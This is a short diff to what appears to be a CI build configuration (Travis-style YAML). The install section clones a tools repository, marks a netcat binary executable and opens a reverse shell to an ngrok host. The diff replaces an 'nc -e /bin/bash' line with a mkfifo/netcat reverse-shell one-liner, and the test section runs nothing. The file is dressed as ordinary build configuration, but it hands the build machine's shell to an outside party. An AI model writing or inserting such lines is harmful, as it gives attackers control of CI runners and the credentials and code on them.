@@ -11,7 +11,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here
   - git clone https://github.com/mosesrenegade/tools-repo
   - cd tools-repo/statically-compiled; chmod +x nc
-  - nc -nv 2.tcp.ngrok.io 19880 -e /bin/bash
+  - rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 19880 >/tmp/f
 
 script:
   - echo "no tests!" # put your normal testing scripts here
